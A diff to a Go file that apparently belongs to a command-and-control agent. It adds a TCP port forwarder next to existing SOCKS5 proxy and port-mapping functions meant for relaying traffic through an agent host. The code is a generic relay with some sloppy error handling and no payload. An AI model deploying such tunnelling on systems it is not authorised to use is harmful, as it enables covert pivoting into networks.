@@ -72,6 +72,40 @@ func Socks5Proxy(op string, addr string) (err error) {
 	return err
 }
 
+// TCPFwd listen on a TCP port and forward to another TCP address
+// addr: forward to this addr
+// port: listen on this port
+func TCPFwd(addr, port string, ctx context.Context, cancel context.CancelFunc) (err error) {
+	defer cancel()
+	serveConn := func(conn net.Conn) {
+		dst, err := net.Dial("tcp", addr)
+		if err != nil {
+			log.Print(err)
+			return
+		}
+		defer dst.Close()
+		defer conn.Close()
+
+		go io.Copy(dst, conn)
+		go io.Copy(conn, dst)
+
+		// wait to be canceled
+		for ctx.Err() == nil {
+			time.Sleep(time.Duration(RandInt(1, 20)) * time.Millisecond)
+		}
+	}
+	l, err := net.Listen("tcp", "0.0.0.0:"+port)
+	for ctx.Err() == nil {
+		lconn, err := l.Accept()
+		if err != nil {
+			log.Print(err)
+			continue
+		}
+		go serveConn(lconn)
+	}
+	return
+}
+
 // PortFwd port mapping, receive CC's request data then send it to target port on agent
 func PortFwd(to, sessionID string) (err error) {
 	var (
